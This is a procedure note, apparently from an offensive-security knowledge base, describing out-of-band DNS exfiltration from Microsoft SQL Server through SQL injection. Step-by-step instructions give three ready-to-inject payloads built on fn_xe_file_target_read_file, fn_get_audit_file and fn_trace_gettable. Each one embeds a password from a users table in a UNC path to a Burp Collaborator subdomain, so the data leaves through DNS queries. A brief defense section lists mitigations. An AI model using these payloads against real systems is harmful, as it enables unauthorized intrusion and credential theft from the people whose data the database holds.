---
id: 63683652-3eab-43b0-8822-ecdecc44906c
name: mssql-out-of-band-dns-exfiltration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.011716+00:00'
updated_at: '2023-04-10T20:22:40.512882+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - '[[techniques/Data Encoding|T1132 - Data Encoding]]'
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques: []
tags:
  - '[[tags/mssql-dns-exfiltration]]'
  - '[[tags/mssql-injection]]'
  - '[[tags/mssql-out-of-band]]'
commands:
  - '[[commands/mssql-check-fn-get-audit-file-access]]'
  - '[[commands/mssql-check-fn-trace-gettable-access]]'
  - '[[commands/mssql-check-fn-xe-file-target-read-file-access]]'
platforms:
  - Windows
  - Database
tools: []
validated: true
---

# mssql-out-of-band-dns-exfiltration

## Summary

This procedure demonstrates how to perform out-of-band DNS exfiltration from a Microsoft SQL Server (MSSQL) database by checking for accessible system functions that enable DNS queries. It leverages SQL injection vulnerabilities to inject queries that trigger DNS resolutions to an attacker-controlled domain, allowing data like passwords to be exfiltrated via DNS without direct HTTP responses.

## Description

Out-of-band DNS exfiltration in MSSQL involves using database functions to construct UNC paths or file targets that resolve to an attacker's DNS server, embedding sensitive data in the subdomain. This bypasses firewalls and proxies that might block direct exfiltration channels. The technique requires an MSSQL injection point and checks for specific permissions: VIEW SERVER STATE for extended events file reading, and CONTROL SERVER for audit and trace functions. Once accessible, these functions can read local files or traces and append data to DNS queries sent to a collaborator server like Burp Collaborator. This is particularly useful in blind SQL injection scenarios where in-band responses are unreliable. The target environment is typically a Windows-based MSSQL server exposed via a web application vulnerable to injection.

## Requirements

1. Valid SQL injection vulnerability in an MSSQL-backed application.
2. Attacker-controlled DNS server or collaborator service (e.g., Burp Collaborator) to capture queries.
3. Basic knowledge of SQL syntax and injection payloads.
4. Network access to the target application.

## Defense

- Implement strict input validation and parameterized queries to prevent SQL injection.
- Monitor outbound DNS traffic for anomalous queries, especially those with encoded subdomains or high volume from database servers.
- Restrict database permissions: Avoid granting VIEW SERVER STATE or CONTROL SERVER to low-privilege accounts.
- Use web application firewalls (WAFs) to detect injection patterns and block UNC path constructions.

## Objectives

1. Verify accessibility of MSSQL functions for DNS-based exfiltration.
2. Exfiltrate sample data (e.g., passwords from a users table) via DNS queries.
3. Confirm the technique's viability in a blind injection scenario.

## Instructions

### Step 1: Check VIEW SERVER STATE Permission via Extended Events

**Context**: This step tests if the database user has VIEW SERVER STATE permission by attempting to read extended event files using fn_xe_file_target_read_file, triggering a DNS resolution with embedded data. Success indicates potential for file-based exfiltration.

**Command** ([[commands/mssql-check-fn-xe-file-target-read-file-access]]):
```sql
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.xem',null,null))
```

> Inject this payload into the vulnerable parameter. The function attempts to read .xel files, appending the password to the UNC path, which resolves via DNS. Monitor your collaborator server for the incoming DNS query containing the exfiltrated data.

### Step 2: Check CONTROL SERVER Permission via Audit Files

**Context**: This step verifies CONTROL SERVER permission by using fn_get_audit_file to access audit logs, embedding data in a DNS-resolving UNC path. This is useful for exfiltrating audit data or confirming high-privilege access.

**Command** ([[commands/mssql-check-fn-get-audit-file-access]]):
```sql
1 and (select 1 where exists(select * from fn_get_audit_file('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\',default,default)))
```

> Inject the payload. If the function is accessible, a DNS query will be sent to your server with the embedded password in the subdomain. A return value of 1 confirms success; otherwise, permission is denied.

### Step 3: Check CONTROL SERVER Permission via Trace Files

**Context**: Similar to the audit check, this uses fn_trace_gettable to read trace files, triggering DNS exfiltration. It's an alternative for environments with trace logging enabled.

**Command** ([[commands/mssql-check-fn-trace-gettable-access]]):
```sql
1 and exists(select * from fn_trace_gettable('\\' + (select pass from users where id=1) + '.xxxx.burpcollaborator.net\1.trc',default))
```

> Inject this into the SQL injection point. Watch for DNS resolution on your collaborator domain. Success is indicated by the query appearing on your DNS server and a non-error response from the database.
